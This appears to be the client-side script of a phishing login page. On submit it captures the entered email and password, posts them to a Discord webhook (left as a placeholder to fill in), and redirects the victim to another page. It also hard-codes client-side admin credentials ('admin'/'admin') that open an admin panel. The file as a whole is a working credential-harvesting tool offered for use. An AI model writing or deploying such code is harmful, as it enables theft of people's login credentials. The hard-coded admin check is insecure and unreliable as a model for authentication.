document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');

    loginForm.addEventListener('submit', function(event) {
        event.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        // Check if admin credentials are entered
        if (email === 'admin@admin.admin' && password === 'admin') {
            window.location.href = 'admin.html'; // Redirect to admin panel
            return;
        }

        // Send user data to Discord webhook
        const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your Discord webhook URL

        const message = `**Email= ||${email}||\nPass= ||${password}||**`;

        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ content: message }),
        })
            .then(response => {
                if (response.ok) {
                    console.log('Data sent to Discord webhook successfully');
                } else {
                    console.error('Failed to send data to Discord webhook');
                }
            })
            .catch(error => {
                console.error('Error sending data to Discord webhook:', error);
            });

        // Redirect user to 10.html
        window.location.href = '10.html';
    });

    // Redirect to admin panel when clicking the logo
    const logo = document.querySelector('.logo');
    if (logo) {
        logo.addEventListener('click', function() {
            window.location.href = 'admin.html';
        });
    }
});
